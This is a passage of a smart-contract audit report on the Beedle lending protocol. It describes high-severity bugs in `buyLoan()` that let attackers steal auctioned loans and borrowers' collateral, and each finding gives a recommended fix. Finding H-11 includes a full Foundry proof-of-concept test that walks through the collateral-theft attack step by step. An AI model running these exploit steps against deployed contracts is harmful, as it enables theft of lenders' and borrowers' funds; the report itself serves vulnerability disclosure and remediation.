[B353N](https://profiles.cyfrin.io/u/undefined), [0xdice91](https://profiles.cyfrin.io/u/undefined), [Mlome](https://profiles.cyfrin.io/u/undefined), [Tatakae](https://codehawks.cyfrin.io/team/clkpe7ipx0001kz08k8k1pp3v), [PTolev](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined), [0xdeth](https://profiles.cyfrin.io/u/undefined), [0xanmol](https://profiles.cyfrin.io/u/undefined), [0xlemon](https://profiles.cyfrin.io/u/undefined), [Aamir](https://profiles.cyfrin.io/u/undefined), [hash](https://profiles.cyfrin.io/u/undefined), [serialcoder](https://profiles.cyfrin.io/u/undefined), [honeymewn](https://profiles.cyfrin.io/u/undefined), [dimulski](https://profiles.cyfrin.io/u/undefined). Selected submission by: [serialcoder](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L489

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L518

## Summary

An attacker can steal any loan opening for auction by executing the `Lender::buyLoan()` and specifying the `poolId` parameter to a forged/fake pool. This vulnerability can even cause the protocol to become insolvent because an attacker moves out the stolen loans' `loanToken` and/or `collateralToken` tokens.

## Vulnerability Details

**Root cause**: the `buyLoan()` lacks verification that the loan's `loanToken` and `collateralToken` must be identical to the new pool. 

Therefore, an attacker can buy the loan using another pool of different `loanToken`/`collateralToken` pair.

To elaborate on this vulnerability, assume that a loan of 1 WETH (`loanToken`) / 2000 USDC (`collateralToken`) is opened for auction. An attacker can execute the `buyLoan()` to buy the loan by pointing to a pool of DAI (`loanToken`) / USDC (`collateralToken`). In this way, the attacker can steal the loan's debt of $2000+ using small DAI tokens (`totalDebt = 1 + lenderInterest + protocolInterest`).

```solidity
    function buyLoan(uint256 loanId, bytes32 poolId) public {
        ...

        // if they do have a big enough pool then transfer from their pool
@>      _updatePoolBalance(poolId, pools[poolId].poolBalance - totalDebt); //@audit balance subtraction from a forged pool
        pools[poolId].outstandingLoans += totalDebt;

        ...

        // update the loan with the new info
@>      loans[loanId].lender = msg.sender; //@audit the attacker becomes a new lender
        loans[loanId].interestRate = pools[poolId].interestRate;
        loans[loanId].startTimestamp = block.timestamp;
        loans[loanId].auctionStartTimestamp = type(uint256).max;
        loans[loanId].debt = totalDebt;

        ...
    }
```

- `Balance subtraction from a forged pool`: https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L489

- `The attacker becomes a new lender`: https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L518

## Impact

An attacker can steal any loan opening for auction by executing the `buyLoan()` and specifying the `poolId` parameter to a forged pool. The forged pool can even point to a pair of fake `loanToken` and `collateralToken`, which has worth $0. 

This vulnerability can even cause the protocol to become insolvent because an attacker moves out the stolen loans' `loanToken` and/or `collateralToken` tokens. Hence, I consider this vulnerability a high-risk issue.

## Tools Used

Manual Review

## Recommendations

I recommend verifying that the loan's `loanToken` and `collateralToken` must be identical to the new pool, as shown below.

```diff
    function buyLoan(uint256 loanId, bytes32 poolId) public {
        ...

+       if (loan.loanToken != pools[poolId].loanToken) revert TokenMismatch();
+       if (loan.collateralToken != pools[poolId].collateralToken) revert TokenMismatch();

        ...

        // if they do have a big enough pool then transfer from their pool
        _updatePoolBalance(poolId, pools[poolId].poolBalance - totalDebt);
        pools[poolId].outstandingLoans += totalDebt;

        ...

        // update the loan with the new info
        loans[loanId].lender = msg.sender;
        loans[loanId].interestRate = pools[poolId].interestRate;
        loans[loanId].startTimestamp = block.timestamp;
        loans[loanId].auctionStartTimestamp = type(uint256).max;
        loans[loanId].debt = totalDebt;

        ...
    }
```
## <a id='H-10'></a>H-10. Stealing any loan opening for auction through others' lending pool

_Submitted by [ElHaj](https://profiles.cyfrin.io/u/undefined), [lealCodes](https://profiles.cyfrin.io/u/undefined), [ptsanev](https://profiles.cyfrin.io/u/undefined), [0xAliX2](https://codehawks.cyfrin.io/team/clkjw3gca000dl708tf0bowdx), [trtrth](https://profiles.cyfrin.io/u/undefined), [0xAsen](https://profiles.cyfrin.io/u/undefined), [StErMi](https://profiles.cyfrin.io/u/undefined), [tiesstevelink](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined), [pengun](https://profiles.cyfrin.io/u/undefined), [sobieski](https://profiles.cyfrin.io/u/undefined), [Mlome](https://profiles.cyfrin.io/u/undefined), [qckhp](https://profiles.cyfrin.io/u/undefined), [Mukund](https://profiles.cyfrin.io/u/undefined), [Cryptic Snake REACH](https://codehawks.cyfrin.io/team/clkl8yzo70009mn08l4myjpwk), [PTolev](https://profiles.cyfrin.io/u/undefined), [1nc0gn170](https://profiles.cyfrin.io/u/undefined), [0x11singh99](https://profiles.cyfrin.io/u/undefined), [Aamir](https://profiles.cyfrin.io/u/undefined), [serialcoder](https://profiles.cyfrin.io/u/undefined), [dimulski](https://profiles.cyfrin.io/u/undefined), [ubermensch](https://profiles.cyfrin.io/u/undefined). Selected submission by: [serialcoder](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L489

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L518

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L304

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L311-L312

## Summary

An attacker can steal any loan opening for auction for free by executing the `Lender::buyLoan()` and inputting anyone else's `poolId` as an argument.

## Vulnerability Details

**Root cause**: the `buyLoan()` lacks verification that a caller (`msg.sender`) must be the new pool's lender. 

Therefore, an attacker (which can be anyone, including a current pool's lender) can execute the `buyLoan()` to force anyone else's lending pool to pay the loan's total debt for the attacker.

Subsequently, the [forced pool has to pay for the debt](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L489) but the [attacker will become a new lender](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L518) for free.

```solidity
    function buyLoan(uint256 loanId, bytes32 poolId) public {
        ...

        // if they do have a big enough pool then transfer from their pool
@>      _updatePoolBalance(poolId, pools[poolId].poolBalance - totalDebt); //@audit the forced pool has to pay for the debt
        pools[poolId].outstandingLoans += totalDebt;

        ...

        // update the loan with the new info
@>      loans[loanId].lender = msg.sender; //@audit the attacker will become a new lender
        loans[loanId].interestRate = pools[poolId].interestRate;
        loans[loanId].startTimestamp = block.timestamp;
        loans[loanId].auctionStartTimestamp = type(uint256).max;
        loans[loanId].debt = totalDebt;

        ...
    }
```
- `The forced pool has to pay for the debt`: https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L489
- `The attacker will become a new lender`: https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L518

Once a borrower repays the loan, the [attacker address will be used to compute the `poolId`](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L304). The computed `poolId` will point to [the attacker's pool](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L311-L312). This way, the attacker can steal the loan principal (`loan.debt`) and interest (`lenderInterest`).

```solidity
    function repay(uint256[] calldata loanIds) public {
        for (uint256 i = 0; i < loanIds.length; i++) {
            ...

            bytes32 poolId = getPoolId(
@>              loan.lender,
                loan.loanToken,
                loan.collateralToken
            );

            // update the pool balance
            _updatePoolBalance(
@>              poolId,
@>              pools[poolId].poolBalance + loan.debt + lenderInterest
            );

            ...
        }
    }
```
- `The attacker address will be used to compute the poolId`: https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L304
- `The computed poolId will point to the attacker's pool`: https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L311-L312

## Impact

An attacker can steal any loan opening for auction for free by executing the `buyLoan()` and inputting anyone else's `poolId` as an argument. This vulnerability is considered a high-risk issue.

## Tools Used

Manual Review

## Recommendations

I recommend verifying that a caller (`msg.sender`) of the `buyLoan()` must be the new pool's lender, as shown below.

```diff
    function buyLoan(uint256 loanId, bytes32 poolId) public {
        ...

+       if (msg.sender != pools[poolId].lender) revert Unauthorized();

        ...

        // if they do have a big enough pool then transfer from their pool
        _updatePoolBalance(poolId, pools[poolId].poolBalance - totalDebt);
        pools[poolId].outstandingLoans += totalDebt;

        ...

        // update the loan with the new info
        loans[loanId].lender = msg.sender;
        loans[loanId].interestRate = pools[poolId].interestRate;
        loans[loanId].startTimestamp = block.timestamp;
        loans[loanId].auctionStartTimestamp = type(uint256).max;
        loans[loanId].debt = totalDebt;

        ...
    }
```
## <a id='H-11'></a>H-11. Attacker can steal a loan's collateral and break the protocol

_Submitted by [daciantemp](https://profiles.cyfrin.io/u/undefined), [1d9f10834c](https://profiles.cyfrin.io/u/undefined), [kutu](https://profiles.cyfrin.io/u/undefined), [ptsanev](https://profiles.cyfrin.io/u/undefined), [0xbepresent](https://profiles.cyfrin.io/u/undefined), [credence0x](https://profiles.cyfrin.io/u/undefined), [StErMi](https://profiles.cyfrin.io/u/undefined), [jprod15](https://profiles.cyfrin.io/u/undefined), [0xAsen](https://profiles.cyfrin.io/u/undefined), [0xepley](https://codehawks.cyfrin.io/team/clkjtgvih0001jt088aqegxjj), [jnrlouis](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined), [qbs](https://profiles.cyfrin.io/u/undefined), [Cryptic Snake REACH](https://codehawks.cyfrin.io/team/clkl8yzo70009mn08l4myjpwk), [BanditSecurity](https://profiles.cyfrin.io/u/undefined), [kupiasec](https://profiles.cyfrin.io/u/undefined), [0xDanielH](https://profiles.cyfrin.io/u/undefined), [PTolev](https://profiles.cyfrin.io/u/undefined), [1nc0gn170](https://profiles.cyfrin.io/u/undefined), [0x11singh99](https://profiles.cyfrin.io/u/undefined), [0xsandy](https://profiles.cyfrin.io/u/undefined), [ubermensch](https://profiles.cyfrin.io/u/undefined), [0xscsamurai](https://profiles.cyfrin.io/u/undefined), [ADM](https://profiles.cyfrin.io/u/undefined). Selected submission by: [StErMi](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L465-L534

## Summary

The platform allows an attacker to steal an auctioned loan's collateral. The result of the attack is that

- At some point, some lender will not be able to withdraw the invested `loanToken` used to create the pool (or add balance to the pool)
- The attacker has stolen the whole loan's collateral amount (minus protocol fee) by just spending `(loan.debt * borrowerFee / 10_000)`

## Vulnerability Details

The attack is pretty complex but is based on different issues that are present in the `buyLoan` function. This function allows
- anyone to call the function even if `msg.sender` is not the owner of the `poolId` passed as parameter. The function at the very end will anyway set `loan.lender = msg.sender` and will update the `newLoanPool.poolBalance` and `newLoanPool.outstandingLoans` without the authorization of the `newLoanPool` real owner
- do not check that the `newLoanPool` is compatible with the `loan` that will be bought. To be specific, the function does not check that `newLoanPool.collateralToken == loan.collateralToken` and `newLoanPool.loanToken == loan.loanToken`

We are in the current scenario

- Alice creates `alicePool` with the following config
	- collateral token = `collateralToken`
	- loan token = `loanToken`
	- poolBalance = `1000 ether` of `loanToken` 
	- the other part of the config is not relevant
- Bob borrows `100 ether` of `loanToken` and provides `100 ether` of `collateralToken` as collateral. This operation generates a `Loan` identified with the id `bobLoan`
- Some time passes by and Alice decides that she wants to auction `bobLoan`. Alice calls `startAuction(bobLoan)`

At this point, the attack starts. Let's call `Paul` our attacker.
- Paul creates a **fake pool** called `fakePool` with the following configuration:
	- collateral token = `fakeCollateralToken`. This token is a fresh and value-less ERC20 token that Paul deployed just before the pool creation.
	- loan token = `fakeLoanToken`. This token is a fresh and value-less ERC20 token that Paul deployed just before the pool creation.
	- poolBalance = `1000 ether` of `fakeLoanToken` 
	- interestRate = `1 wei`. This allows Paul to be able to instantly buy the loan without waiting for the auction to decay the `currentAuctionRate`
	- the other part of the config is not relevant
- Paul at this point has bought `bobLoan` spending value-less tokens by using a `fakePool` that uses tokens incompatible with `alicePool` and `bobLoan`

Already at this point, we have created a huge problem for the protocol because 
- Bob will not be able to refinance or repay the loan to take back the collateral. Those function would try to update a pool identified by `(paul, loan.loanToken, loan.collateralToken)` but such pool does not exist because the loan has been "bought" by using `fakePool` identified as `(paul, fakeLoanToken, fakeCollateralToken)`. Because the pool with the tokens used by the Loan do not exist, both `repay` and `refinance` will revert to an underflow error
- At some point some Lender won't be able to withdraw their `loanToken` because Paul has not provided any `loanToken` to create the `fakePool` but only an amount of `fakeLoanToken`

Paul now performs the final step to steal the collateral that Bob has provided to open the `borrow` position. To do so, Paul needs to seize `bobLoan`. 

The only problem for Paul is that the function perform this operation at the very end

```solidity
bytes32 poolId = keccak256(
	abi.encode(loan.lender, loan.loanToken, loan.collateralToken)
);

// update the pool outstanding loans
pools[poolId].outstandingLoans -= loan.debt;
```

But at the moment `pools[poolId]` does not exist because Paul has only created a pool that uses the fake tokens. To be able to finish the attack, Paul needs to perform

1) Paul creates a **real pool** called `paulPool` with the following configuration
	- collateral token = `collateralToken` (equal to `bobLoan.collateralToken`)
	- loan token = `loanToken`. (equal to `bobLoan.loanToken`)
	- poolBalance = `bobLoan.debt ether` of `loanToken`. We just need to make the `seizeLoan` function **not revert** when it updates the `paulPool.outstandingLoans` state variable
	- interestRate = `1 wei`. This allows Paul to be able to instantly buy the loan without waiting for the auction to decay the `currentAuctionRate`
	- minLoanSize <= `bobLoan.debt`. In this case, we can set it to `1 wei`
	- maxLoanRatio = `type(uint256).max`. The attacker wants to be able to provide less collateral as possible to perform the needed debt
2) Paul perform an auto-borrow operation. Be borrows `loanToken` from his own `paulPool` to maximize the final profit, spending as less as possible. Paul borrows from `paulPool` `bobLoan.debt` tokens, providing **only** `1 wei` of `collateralToken`. This is possible because `paulPool.maxLoanRatio == type(uint256).max`. By performing this operation, we now have `paulPool.outstandingDebt == bobLoan.debt`. At the end of the operation, Paul will have in his balance `bobLoan.debt - borrowerProtocolFee` of `loanToken`
3) Paul calls `startAuction([bobLoan])` starting the loan auction
4) Paul calls `seizeLoan([bobLoan])` that will seize `bobLoan.collateral` amount of `collateralToken` and will send them to the attacker (minus the protocol fee)

At the end of the attack, Paul has invested just `bobLoan.debt * borrowerFee / 10_000` of `loanToken` to perform the needed borrow operation and has gained the whole `bobLoan.collateral` (minus the protocol fee).

## Impact

The platform allows an attacker to steal an auctioned loan's collateral. The result of the attack is that

- At some point, some lender will not be able to withdraw the invested `loanToken` used to create the pool (or add balance to the pool)
- The attacker has stolen the whole loan's collateral amount (minus protocol fee) by just spending `(loan.debt * borrowerFee / 10_000)`

## Tools Used

Manual + foundry test

#### `BaseLender.sol` utility contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Lender.sol";

import {ERC20} from "solady/src/tokens/ERC20.sol";

contract TERC20 is ERC20 {

    function name() public pure override returns (string memory) {
        return "Test ERC20";
    }

    function symbol() public pure override returns (string memory) {
        return "TERC20";
    }

    function mint(address _to, uint256 _amount) public {
        _mint(_to, _amount);
    }
}

contract WrappedLender is Lender {
    
    function getLoanDebtDetail(uint256 loanId) external view returns (uint256 fullDebt, uint256 interest, uint256 fees) {
        Loan memory loan = loans[loanId];
        // calculate the accrued interest
        (interest, fees) = _calculateInterest(loan);
        fullDebt = loan.debt + interest + fees;
    }

    function getPoolInfo(bytes32 poolId) external view returns (Pool memory) {
        return pools[poolId];
    }

    function getLoanInfo(uint256 loanId) external view returns (Loan memory) {
        return loans[loanId];
    }

    function calculateInterest(
        Loan memory loan
    ) external view returns (uint256 interest, uint256 fees) {
        return _calculateInterest(loan);
    }

}

contract BaseLender is Test {
    WrappedLender public lender;

    TERC20 public loanToken;
    TERC20 public collateralToken;

    address public lender1 = address(0x1);
    address public lender2 = address(0x2);
    address public borrower = address(0x3);
    address public fees = address(0x4);

    function setUp() public virtual {
        lender = new WrappedLender();
        loanToken = new TERC20();
        collateralToken = new TERC20();

        loanToken.mint(address(lender1), 100000 ether);
        loanToken.mint(address(lender2), 100000 ether);
        collateralToken.mint(address(borrower), 100000 ether);

        vm.startPrank(lender1);
        loanToken.approve(address(lender), 1000000 ether);
        collateralToken.approve(address(lender), 1000000 ether);

        vm.startPrank(lender2);
        loanToken.approve(address(lender), 1000000 ether);
        collateralToken.approve(address(lender), 1000000 ether);

        vm.startPrank(borrower);
        loanToken.approve(address(lender), 1000000 ether);
        collateralToken.approve(address(lender), 1000000 ether);
    }


    function borrow(address _borrower, bytes32 poolId) public {
        vm.startPrank(_borrower);
        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 100 ether,
            collateral: 100 ether
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;
        lender.borrow(borrows);
        vm.stopPrank();
    }

    function createPool(address _lender) public returns (bytes32){
        vm.startPrank(_lender);
        Pool memory p = Pool({
            lender: _lender,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100 ether,
            poolBalance: 1000 ether,
            maxLoanRatio: 2 ether,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(p);
        vm.stopPrank();

        return poolId;
    }

    function startAuction(address _lender, uint256 loanId) public {
        uint256[] memory loans = new uint256[](1);
        loans[0] = loanId;

        vm.prank(_lender);
        lender.startAuction(loans);
    }

    function seizeLoan(uint256 loanId) public {
        uint256[] memory loans = new uint256[](1);
        loans[0] = loanId;
        lender.seizeLoan(loans);
    }

    function getPoolId(address _lender) public returns (bytes32) {
        return keccak256(
            abi.encode(
                address(_lender),
                address(loanToken),
                address(collateralToken)
            )
        );
    }
}
```

#### `AttackerStealLoanCollateral.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./BaseLender.sol";

contract AttackerStealLoanCollateralTest is BaseLender {

    function setUp() override public {
        super.setUp();
    }

    function testBuyLoanWithFakePool() public {
        // The current implementation of `buyLoan` do not perform two important checks
        // 1) does not check that the newPool lender is msg.sender and set the msg.sender = loan.lender
        //    this allows anyone to purchase the loan on behalf os someone else that has not given the authorization to do that
        // 2) does not check that the newPool collateral token and loanToken are equal to the one of the loan
        //    this enable the attacker to purchase the loan by using some fake (valueless) token as pool tokens
        // This allows the attacker to purchase the loan by using a "fake pool" that has been created with "fake tokens" as coll/loan tokens
        // The attacker has not spent any of the original loan collateralToken or loanToken to deploy the pool
        // And the loan.lender is now set to the attacker address

        // Lender1 creates a pool with some valid loanToken and collateralToken funding the pool with 1000 ether of loanToken
        bytes32 pool1 = createPool(lender1);

        // A Borrower creates a loan taking 100 ether of loanToken in debt and providing 100 ether of collateralToken as collateral
        borrow(borrower, pool1);

        // the loanID
        uint256 loanId = 0;

        // warp some time and accrue interest, not needed but we want to be realistic
        vm.warp(block.timestamp + 364 days + 12 hours);
        
        // Lender1 decide to sell or liquidate the loan and starts an auction
        uint256[] memory loans = new uint256[](1);
        loans[0] = loanId;

        vm.prank(lender1);
        lender.startAuction(loans);

        
        // We warp in the middle of the action to be able to purchase the loan
        vm.warp(block.timestamp + 12 hours);

        
        Loan memory loanBefore = lender.getLoanInfo(loanId);

        address attacker = makeAddr("attacker");
        

        // The attacker deploy a fake (valueless) erc20 token
        // that will be used as loanToken and collateralToken for a fake-pool
        // The attacker mint 100_000 ether of those token each and approve the Lending protocol for the max available amount
        TERC20 fakeCollateralToken = new TERC20();
        TERC20 fakeLoanToken = new TERC20();

        vm.startPrank(attacker);
        fakeCollateralToken.mint(attacker, 100_000 ether);
        fakeCollateralToken.approve(address(lender), type(uint256).max);
        fakeLoanToken.mint(attacker, 100_000 ether);
        fakeLoanToken.approve(address(lender), type(uint256).max);
        vm.stopPrank();

        // The attacker create a fake-pool on the platform using those fake token as collateral and loan tokens
        // The `interestRate` is set to 1 (minimum value) to be able to purchase the loan as soon as possible
        // We are not interested anyway in this pool because we just need to be able to purchase the loan without paying
        // anything that has a value. The pool is created by using `1000 ether` of the FAKE loan tokens!
        vm.prank(attacker);
        bytes32 fakePoolId = lender.setPool(Pool({
            lender: attacker,
            loanToken: address(fakeLoanToken),
            collateralToken: address(fakeCollateralToken),
            minLoanSize: 100 ether,
            poolBalance: 1000 ether,
            maxLoanRatio: 2 ether,
            auctionLength: 1, // does not matter but lower is easier is to attack
            interestRate: 1, // does not matter but lower is and easier is to attack
            outstandingLoans: 0
        }));

        Pool memory fakePoolInfoBefore = lender.getPoolInfo(fakePoolId);

        // the attacker purchase the loan with the fake pool
        // the check `pools[poolId].interestRate > currentAuctionRate` is passed because our pool
        // there is no check about newPool.collateralToken == loan.collateralToken
        // there is no check about newPool.loanToken == loan.loanToken
        // After the purchase we will be in this situation
        // loan.lender = attacker
        // loan.interestRate = 1
        // fakePool.poolBalance = 1000 ether of fakeLoanToken - (loan.debt + lenderInterest + protocolInterest)
        // fakePool.outstandingLoans = 0 + (loan.debt + lenderInterest + protocolInterest)
        vm.prank(attacker);
        lender.buyLoan(loanId, fakePoolId);

        

        Pool memory fakePoolInfoAfter = lender.getPoolInfo(fakePoolId);
        Loan memory loanAfter = lender.getLoanInfo(loanId);

        // assert that the attacker was able to purchase the loan even if the pool's tokens are different compared to the loan's tokens
        assertTrue( fakePoolInfoAfter.loanToken != loanAfter.loanToken );
        assertTrue( fakePoolInfoAfter.collateralToken != loanAfter.collateralToken );

        // assert that the lender of the loan's lender is indeed the attacker
        assertEq( lender1, loanBefore.lender );
        assertEq( fakePoolInfoAfter.lender, loanAfter.lender );
        assertEq( fakePoolInfoAfter.lender, attacker );

        // attacker pool variables have been updated
        // The fakePool.poolBalance has been reduced by loan.debt + lenderInterest + protocolInterest
        assertEq(fakePoolInfoBefore.poolBalance, 1000 ether);
        assertLt(fakePoolInfoAfter.poolBalance, fakePoolInfoBefore.poolBalance);
        
        // fakePool.outstandingLoans has been increased by loan.debt + lenderInterest + protocolInterest
        assertEq(fakePoolInfoBefore.outstandingLoans, 0);
        assertGt(fakePoolInfoAfter.outstandingLoans, fakePoolInfoBefore.outstandingLoans);

        // At this point we know that the platform is already broken (we demostrated this with also another issue)
        // 1) The loan cannot be seized/bought unless the ATTACKER decides so. The attacker also will not call `giveLoan`
        // 2) The borrower cannot refinance the loan (changing the pool) because `refinance` function use a `poolId` generated by the `loan` info
        //    and this pool does not exist yet because poolIdFromLoan = (attacker, loanToken, collateralToken)
        //    while the pool created by the attackr is identified by the fakePoolId = (attacker, fakeLoanToken, fakeCollateralToken)
        //    because of this the `borrow` operation will fail for an underflow error when it tries to call `_updatePoolBalance`
        // 3) The borrower cannot repay the loan for the same reason of point (2)
        // 4) The protocol has already accumulated a loss because the loan has been purchased by a Pool that have NOT provided
        //    any loanToken. This mean that when the original pool1 owner will remove his capital he will remove the capital provided
        //    by someone else. At some point there will be a lender that will not be able to remove the capital because it will not be
        //    available in the Lender contract!

        // Loan cannot be repaid by Borrower
        {
            loans = new uint256[](1);
            loans[0] = loanId;

            // Revert because of underflow
            vm.prank(borrower);
            vm.expectRevert(stdError.arithmeticError);
            lender.repay(loans);
        }


        // Loan cannot be refinanced by Borrower
        {
            Refinance[] memory rs = new Refinance[](1);
            rs[0] = Refinance({
                loanId: loanId,
                poolId: fakePoolId,
                debt: 100 ether,
                collateral: 100 ether
            });


            vm.prank(borrower);
            // Revert because of underflow
            vm.expectRevert(TokenMismatch.selector);
            lender.refinance(rs);
        }

        // At this point the attacker want to finish his chained attack by STEALING the REAL collateral provided by the borrower for his loan
        // What it needs to do is 
        // 1) create a "real" pool by using the real collateralToken and loanToken. The pool just need to provide `loanTokenAmount == originalLoan.debt` to make the attack
        // 2) configure the pool with a maxLoanRatio = type(uint256).max (to be able to later borrow by using the lower amount of collateral possible)
        //    the rest of config does not matter much but we just set it to gain the max possible value from the attack
        // 3) at this point he needs to create a loan by auto-borrowing from his own pool
        //    this is needed for two reasons
        // 3a) First of all in order to later seize the `originalLoan` (the one made by `borrower`) 
        //     we need to have the realAttackerPool.outstandingLoans == borrowerOriginalLoan.debt otherwise `seizeLoan` will revert for underflow
        // 3b) By auto-borrowing we are not going to lose any (only the protocol fees) of the loanToken that we have sent to the `Lender` contract to deploy the pool
        // 4) At this point the attackr call the borrow function by borrowing `originalLoan.debt` and providing ONLY 1 wei of collateral (because we have set maxLoanRatio = type(uint256).max)
        // 5) The next step is to trigger an auction and wait for the auction to end to trigger the seize loan
        // 6) When `seizeLoan` is called it will send the `originalLoan.collateral` to the `orignalLoan.lender` (attacker)
        // At the end of the process the attacker has stolen from the platform the collateral of the original borrower (minus protocol fee)
        
        vm.startPrank(attacker);
        // The attacker just needs 1 wei of collateral token to perform the `borrow` operation
        // because it will create the pool with `maxLoanRatio = type(uint256).max`
        collateralToken.mint(attacker, 1);
        collateralToken.approve(address(lender), 1);

        // The attacker needs to fund the pool with just the `loanToken` needed to be able to perform the `borrow` operation
        // without borrowing the `seizeLoan` operation (to steal the original borrower collateral) would revert for underflow
        loanToken.mint(attacker, loanAfter.debt);
        loanToken.approve(address(lender), loanAfter.debt);
        vm.stopPrank();

        // the amount we have invested into the attack
        uint256 collateralTokenBalanceBefore = collateralToken.balanceOf(attacker);
        uint256 loanTokenalanceBefore = loanToken.balanceOf(attacker);

        // Attacker create the pool by funding it with `loanAfter.debt` amount of `loanToken`
        // it's important to set `maxLoanRatio = type(uint256).max` to borrow from the pool with the minimum amount of collateral
        // this allow us to "lose" less collateral possible
        vm.prank(attacker);
        bytes32 attackerPoolId = lender.setPool(Pool({
            lender: attacker,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 1,
            poolBalance: loanAfter.debt,
            maxLoanRatio: type(uint256).max,
            auctionLength: 1, // does not matter but lower is easier is to attack
            interestRate: 1, // does not matter but lower is and easier is to attack
            outstandingLoans: 0
        }));
        
        
        // Attacker needs to borrow only what's needed to make `pool.outstandingLoans == loan.debt`
        // In this way the `seize` operation will not revert for underflow
        // because of how pool is configured he can just provide 1 wei of collateral.
        // That's made possible by having `pool.maxLoanRatio = type(uint256).max`
        // By auto-borrowing he's not losing the amount of `lendingToken` that have been provided by creating the pool
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = Borrow({
            poolId: attackerPoolId,
            debt: loanAfter.debt,
            collateral: 1
        });
        vm.prank(attacker);
        lender.borrow(borrows);


        // Start the auction to self-liquidate the Loan of `borrower` that have been acquired from `pool1`
        // Unfortunately we need to wait 1 full day even if the new pool have been configured with `auctionLength = 1 second`
        // because when buying the loan this config is not updated on the loan itself (I think that this is a bug)
        vm.prank(attacker);
        lender.startAuction(loans);

        // Wait until the auction has ended to be able to seize the original loan
        vm.warp(block.timestamp + 1 days);

        // attacker size the original Loan from the borrower
        // that will send the collateral (of the original borrower) to our ourself

        loans = new uint256[](1);
        loans[0] = loanId;

        vm.prank(attacker);
        lender.seizeLoan(loans);

        // at the very end the attacker must have gained both collateralToken and loanToken

        // We got the whole loan collateral of the original loan minus 0,5% (protocol fee)
        // In this case we invested 1 wei (to make the auto-borrow) of collateralToken to get back 99,5 ether of collateral token! (100 ether - 0,5% fee)
        assertEq(collateralTokenBalanceBefore, 1);
        assertEq(collateralToken.balanceOf(attacker), loanAfter.collateral - (loanAfter.collateral * lender.borrowerFee() / 10000));

        // We got a little bit less of the total loanToken amount we have provided during the creation of the pool
        // because the protocol take a 0.5% fee on the borrow operation but I woul say that the gain is much higher considering that we took the whole
        // original loan collateral (minus protocol fee) by paing such a little
        // in this specific scenario we have provided 110 ether of loanToken and we got back 109,45 ether!
        assertEq(loanToken.balanceOf(attacker), loanTokenalanceBefore - (loanTokenalanceBefore * lender.borrowerFee() / 10000));

    }
}
```

## Recommendations

The `buyFunction` should perform additional checks
- `msg.sender` must be the owner of the pool identified by the function input parameter `poolId`
- The `pools[poolId].collateralToken` must be equal to `loan.collateralToken` and `pools[poolId].loanToken` must be equal to `loan.loanToken`
## <a id='H-12'></a>H-12. Fee on transfer tokens will cause users to lose funds

